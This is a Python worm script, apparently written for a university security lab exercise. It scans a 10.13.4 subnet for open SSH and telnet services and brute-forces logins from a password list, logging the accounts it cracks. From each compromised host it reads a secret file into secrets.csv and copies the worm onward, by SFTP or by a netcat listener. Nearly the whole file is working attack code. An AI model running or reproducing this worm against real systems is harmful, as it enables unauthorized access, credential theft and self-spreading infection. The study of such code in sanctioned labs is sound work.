import subprocess
import paramiko
import sys
import telnetlib
import io
from time import time

def find_vulnerable_machines(ip_bytes):
    '''
    Output:
    open_ssh.log or open_telnet.log
    - File of ips with open ports using either ssh or telnet.

    '''
    subprocess.run(["bash", "./try_ports.sh", ip_bytes])

def find_vulnerable_users():
    '''
    Output:
    ssh_accounts.log
    telnet_accounts.log
    - Files formatted ip,user,passwd of cracked users.

    '''
    sys.tracebacklimit=0
    #client = paramiko.client.SSHClient()
    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open("/home/cse/Lab2/Q2pwd") as file:
        user_combos = file.readlines()
    user_combos = [u.strip().split(" ")for u in user_combos]

    with open("open_ssh.log") as file:
        ssh_log = file.readlines()
    ssh_log = [ip.strip() for ip in ssh_log]
    with open("open_telnet.log") as file:
        telnet_log = file.readlines()
    telnet_log = [ip.strip() for ip in telnet_log]
    for ip in ssh_log:
        for user, password in user_combos:
            while True:
                try:
                    client = paramiko.client.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, username=user, password=password, timeout=200)
                    with open("ssh_accounts.log", "a") as file:
                        file.write(f"{ip},{user},{password}\n")
                        client.close()
                        break
                except paramiko.ssh_exception.AuthenticationException:
                    break
                except paramiko.ssh_exception.SSHException:
                    pass
    for ip in telnet_log:
        for user, password in user_combos:
            tn = telnetlib.Telnet(ip)
            tn.read_until(b"login: ")
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")
            if tn.read_until(b"Welcome", timeout=1) == b"\r\nWelcome":
                with open("telnet_accounts.log", "a") as file:
                        file.write(f"{ip},{user},{password}\n")


def extract_and_infect():
    '''


    '''
    with open("ssh_accounts.log", "r") as file:
        contents = file.readlines()
    contents = [c.strip().split(',') for c in contents]
    with open("telnet_accounts.log", "r") as file:
        tel_contents = file.readlines()
    tel_contents = [t.strip().split(',') for t in tel_contents]
    for ip, user, password in contents:
        while True:
            try:
                client = paramiko.client.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=password)
                stdin, stdout, stderr = client.exec_command('cat Q2secret')
                sftp = client.open_sftp()
                with sftp.file('Q2secret', 'r') as remote_file:
                    file_contents = remote_file.read()
                string_contents = io.StringIO(file_contents.decode())
                with open("secrets.csv", "a") as file:
                    file.write(f"{ip},{user},{string_contents.getvalue()}")
                sftp.put("Q2worm.py", "worm.py")
                sftp.close()
                client.close()
                break
            except paramiko.ssh_exception.SSHException:
                pass
    for ip, user, password in tel_contents:
        tn = telnetlib.Telnet(ip)
        tn.read_until(b"login: ")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        tn.read_until(b"$ ")
        tn.write("cat Q2secret".encode('ascii') + b"\n")
        secret = tn.read_until(b"$ ").decode()
        secret = secret.split("\n")
        with open("secrets.csv", "a") as file:
            for s in secret:
                if "$" not in s and "cat" not in s:
                    file.write(f"{ip},{user},{s.strip()}")
        tn.write(b"nc -l -p 1234 > worm.py" + b"\n")
        subprocess.run(["nc", "-q", "1", ip, "1234"], stdin=open("Q2worm.py"))
        tn.close()

if __name__ == '__main__':
    t0 = time()
    ip_bytes = "10.13.4"
    find_vulnerable_machines(ip_bytes)
    find_vulnerable_users()
    extract_and_infect()
    tf = time()
    print(f"Total time: {int((tf-t0)/60)} minutes and {int((tf-t0)%60)} seconds.")
